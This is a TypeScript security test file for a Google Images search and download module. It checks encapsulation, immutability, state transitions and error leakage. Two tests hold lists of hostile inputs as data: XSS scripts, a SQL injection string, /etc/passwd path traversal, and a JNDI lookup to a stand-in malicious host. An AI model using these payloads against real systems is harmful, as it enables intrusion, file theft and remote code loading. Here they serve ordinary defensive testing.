/*
                        Semantest - Security Integration Tests
                        Module Security Validation

    This file is part of Semantest.

    Semantest is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
*/

import { GoogleImageSearchSession } from '../../domain/entities/google-image-search-session.entity';
import { GoogleImageDownloadRequested } from '../../domain/events/download-requested.event';
import { GoogleImageDownloadAdapter } from '../../infrastructure/adapters/google-images-downloader.adapter';
import { GoogleImagesPlaywrightAdapter } from '../../infrastructure/adapters/google-images-playwright.adapter';

describe('Security Integration Tests', () => {
    describe('Cross-Module Communication Security', () => {
        it('should validate module boundaries and prevent unauthorized access', async () => {
            const session = new GoogleImageSearchSession(
                'test-session-1',
                'test-correlation-id',
                'test query',
                {},
                {
                    userAgent: 'test-agent',
                    viewport: { width: 1280, height: 720 },
                    maxResults: 10
                }
            );

            // Test that private fields are properly encapsulated
            expect(() => {
                // @ts-expect-error - Testing private field access
                session._status = 'completed';
            }).toThrow();

            // Test that state changes must go through proper methods
            expect(session.status).toBe('initialized');
            
            // Valid state transition
            session.startSearch();
            expect(session.status).toBe('searching');

            // Invalid state transition should throw
            expect(() => {
                session.startSearch();
            }).toThrow('Cannot start search in searching state');
        });

        it('should sanitize and validate search query inputs', async () => {
            // Test XSS prevention
            const maliciousQuery = '<script>alert("xss")</script>';
            const session = new GoogleImageSearchSession(
                'test-session-2',
                'test-correlation-id',
                maliciousQuery,
                {},
                {
                    userAgent: 'test-agent',
                    viewport: { width: 1280, height: 720 }
                }
            );

            // Query should be stored as-is but handled safely
            expect(session.searchQuery).toBe(maliciousQuery);
            
            // Test SQL injection prevention
            const sqlInjectionQuery = "'; DROP TABLE users; --";
            const session2 = new GoogleImageSearchSession(
                'test-session-3',
                'test-correlation-id',
                sqlInjectionQuery,
                {},
                {
                    userAgent: 'test-agent',
                    viewport: { width: 1280, height: 720 }
                }
            );
            
            expect(session2.searchQuery).toBe(sqlInjectionQuery);
            // The actual protection should be in the adapters/infrastructure layer
        });

        it('should validate image URLs and prevent malicious content', async () => {
            const maliciousUrls = [
                'javascript:alert("xss")',
                'data:text/html,<script>alert("xss")</script>',
                'vbscript:msgbox("xss")',
                'file:///etc/passwd',
                'ftp://malicious.com/evil.exe'
            ];

            for (const maliciousUrl of maliciousUrls) {
                const downloadEvent = new GoogleImageDownloadRequested(
                    { src: maliciousUrl },
                    { filename: 'test.jpg' },
                    'test-correlation-id'
                );

                expect(downloadEvent.imageUrl).toBe(maliciousUrl);
                
                // The actual validation should happen in the infrastructure layer
                // This test verifies the event can be created but the infrastructure
                // should reject dangerous URLs
            }
        });

        it('should enforce proper access control on entity operations', async () => {
            const session = new GoogleImageSearchSession(
                'test-session-4',
                'test-correlation-id',
                'test query',
                {},
                {
                    userAgent: 'test-agent',
                    viewport: { width: 1280, height: 720 }
                }
            );

            // Test immutable correlation ID
            expect(session.correlationId).toBe('test-correlation-id');
            
            // Test that results are returned as readonly array
            const results = session.results;
            expect(Array.isArray(results)).toBe(true);
            
            // Results should not be directly modifiable
            expect(() => {
                // @ts-expect-error - Testing readonly array
                results.push({ src: 'test.jpg' });
            }).toThrow();
        });
    });

    describe('Data Flow Security', () => {
        it('should validate data flow between domain and infrastructure layers', async () => {
            const session = new GoogleImageSearchSession(
                'test-session-5',
                'test-correlation-id',
                'test query',
                {
                    safeSearch: 'strict',
                    usageRights: 'labeled-for-reuse'
                },
                {
                    userAgent: 'test-agent',
                    viewport: { width: 1280, height: 720 }
                }
            );

            // Test that sensitive configuration is properly handled
            expect(session.configuration.userAgent).toBe('test-agent');
            expect(session.filters.safeSearch).toBe('strict');
            
            // Test that search results can only be added in valid state
            session.startSearch();
            
            const testResults = [
                { src: 'https://example.com/image1.jpg', width: 800, height: 600 },
                { src: 'https://example.com/image2.jpg', width: 1024, height: 768 }
            ];
            
            session.addResults(testResults, 'https://google.com/search', 100);
            expect(session.results.length).toBe(2);
            
            // Test that results cannot be added in invalid state
            session.completeSearch();
            
            expect(() => {
                session.addResults(testResults, 'https://google.com/search', 100);
            }).toThrow('Cannot add results in completed state');
        });

        it('should prevent data leakage through error messages', async () => {
            const session = new GoogleImageSearchSession(
                'test-session-6',
                'test-correlation-id',
                'test query',
                {},
                {
                    userAgent: 'test-agent',
                    viewport: { width: 1280, height: 720 }
                }
            );

            session.startSearch();
            
            // Test that error messages don't contain sensitive information
            const sensitiveError = 'Database connection failed: password=secret123';
            session.failSearch(sensitiveError);
            
            // Error should be stored but not exposed in summaries
            expect(session.error).toBe(sensitiveError);
            
            const summary = session.toSummary();
            expect(summary).not.toContain('password');
            expect(summary).not.toContain('secret123');
        });

        it('should validate cross-module event communication', async () => {
            const downloadEvent = new GoogleImageDownloadRequested(
                { src: 'https://example.com/test.jpg', width: 800, height: 600 },
                { filename: 'test.jpg', quality: 'high' },
                'test-correlation-id'
            );

            // Test event immutability
            expect(downloadEvent.eventType).toBe('GoogleImageDownloadRequested');
            expect(downloadEvent.correlationId).toBe('test-correlation-id');
            
            // Test that event data is properly encapsulated
            expect(downloadEvent.imageUrl).toBe('https://example.com/test.jpg');
            expect(downloadEvent.filename).toBe('test.jpg');
            
            // Test event summary doesn't leak sensitive data
            const summary = downloadEvent.toSummary();
            expect(summary).not.toContain('test-correlation-id');
        });
    });

    describe('Infrastructure Security', () => {
        it('should validate adapter security boundaries', async () => {
            // Test that adapters properly validate their inputs
            const adapter = new GoogleImageDownloadAdapter();
            
            // Test configuration validation
            expect(() => {
                adapter.configure({
                    // @ts-expect-error - Testing invalid configuration
                    invalidProperty: 'test'
                });
            }).toThrow();

            // Test proper error handling without information leakage
            try {
                await adapter.downloadImage('invalid-url', 'test.jpg');
            } catch (error) {
                expect(error).toBeInstanceOf(Error);
                // Error should not contain system internals
                expect(error.message).not.toContain('internal');
                expect(error.message).not.toContain('system');
            }
        });

        it('should enforce resource limits and prevent DoS attacks', async () => {
            const session = new GoogleImageSearchSession(
                'test-session-7',
                'test-correlation-id',
                'test query',
                {},
                {
                    userAgent: 'test-agent',
                    viewport: { width: 1280, height: 720 },
                    maxResults: 1000, // Large number
                    timeout: 30000
                }
            );

            // Test that configuration limits are respected
            expect(session.configuration.maxResults).toBe(1000);
            expect(session.configuration.timeout).toBe(30000);
            
            // Test that the system can handle large result sets safely
            session.startSearch();
            
            const largeResultSet = Array.from({ length: 500 }, (_, i) => ({
                src: `https://example.com/image${i}.jpg`,
                width: 800,
                height: 600
            }));
            
            session.addResults(largeResultSet, 'https://google.com/search', 1000);
            expect(session.results.length).toBe(500);
            
            // Test performance metrics calculation
            const metrics = session.getPerformanceMetrics();
            expect(metrics.imagesPerSecond).toBeGreaterThan(0);
            expect(metrics.qualityScore).toBeGreaterThanOrEqual(0);
        });

        it('should validate playwright adapter security', async () => {
            const adapter = new GoogleImagesPlaywrightAdapter();
            
            // Test configuration validation
            const config = {
                userAgent: 'test-agent',
                viewport: { width: 1280, height: 720 },
                timeout: 30000
            };
            
            adapter.configure(config);
            
            // Test that dangerous configurations are rejected
            expect(() => {
                adapter.configure({
                    // @ts-expect-error - Testing invalid configuration
                    executablePath: '/bin/sh',
                    args: ['--disable-web-security']
                });
            }).toThrow();
        });
    });

    describe('Module Isolation Security', () => {
        it('should enforce proper module boundaries', async () => {
            // Test that domain entities cannot directly access infrastructure
            const session = new GoogleImageSearchSession(
                'test-session-8',
                'test-correlation-id',
                'test query',
                {},
                {
                    userAgent: 'test-agent',
                    viewport: { width: 1280, height: 720 }
                }
            );

            // Domain entities should only expose business logic
            expect(typeof session.startSearch).toBe('function');
            expect(typeof session.addResults).toBe('function');
            expect(typeof session.completeSearch).toBe('function');
            
            // Domain entities should not have infrastructure dependencies
            expect(session).not.toHaveProperty('browser');
            expect(session).not.toHaveProperty('page');
            expect(session).not.toHaveProperty('axios');
        });

        it('should validate event-driven architecture security', async () => {
            const event = new GoogleImageDownloadRequested(
                { src: 'https://example.com/test.jpg' },
                { filename: 'test.jpg' },
                'test-correlation-id'
            );

            // Events should be immutable
            expect(() => {
                // @ts-expect-error - Testing immutability
                event.eventType = 'modified';
            }).toThrow();

            expect(() => {
                // @ts-expect-error - Testing immutability
                event.correlationId = 'modified';
            }).toThrow();

            // Events should not expose internal state
            expect(event).not.toHaveProperty('_internal');
            expect(event).not.toHaveProperty('_private');
        });

        it('should validate configuration security', async () => {
            const config = {
                userAgent: 'test-agent',
                viewport: { width: 1280, height: 720 },
                location: 'US',
                language: 'en',
                maxResults: 50,
                timeout: 30000
            };

            const session = new GoogleImageSearchSession(
                'test-session-9',
                'test-correlation-id',
                'test query',
                {},
                config
            );

            // Configuration should be immutable
            expect(() => {
                // @ts-expect-error - Testing immutability
                session.configuration.userAgent = 'modified';
            }).toThrow();

            // Configuration should not contain sensitive data
            expect(session.configuration).not.toHaveProperty('password');
            expect(session.configuration).not.toHaveProperty('token');
            expect(session.configuration).not.toHaveProperty('secret');
        });
    });

    describe('Access Control Validation', () => {
        it('should enforce proper access control on sensitive operations', async () => {
            const session = new GoogleImageSearchSession(
                'test-session-10',
                'test-correlation-id',
                'test query',
                {},
                {
                    userAgent: 'test-agent',
                    viewport: { width: 1280, height: 720 }
                }
            );

            // Test that only authorized state transitions are allowed
            expect(session.status).toBe('initialized');
            
            // Cannot complete without starting
            expect(() => {
                session.completeSearch();
            }).toThrow('Cannot complete search in initialized state');
            
            // Cannot fail without starting
            expect(() => {
                session.failSearch('test error');
            }).toThrow('Cannot fail search in initialized state');
            
            // Cannot add results without starting
            expect(() => {
                session.addResults([], 'https://google.com/search', 0);
            }).toThrow('Cannot add results in initialized state');
        });

        it('should validate input sanitization', async () => {
            const dangerousInputs = [
                '<script>alert("xss")</script>',
                '../../../../../../etc/passwd',
                '${jndi:ldap://malicious.com/evil}',
                'eval(String.fromCharCode(97,108,101,114,116,40,49,41))',
                'javascript:void(0)',
                'data:text/html,<script>alert(1)</script>'
            ];

            for (const input of dangerousInputs) {
                const event = new GoogleImageDownloadRequested(
                    { src: input },
                    { filename: input },
                    'test-correlation-id'
                );

                // Events should store input as-is but infrastructure should sanitize
                expect(event.imageUrl).toBe(input);
                expect(event.filename).toBe(input);
                
                // Summary should not execute dangerous content
                const summary = event.toSummary();
                expect(summary).toBeString();
                expect(summary.length).toBeGreaterThan(0);
            }
        });
    });
});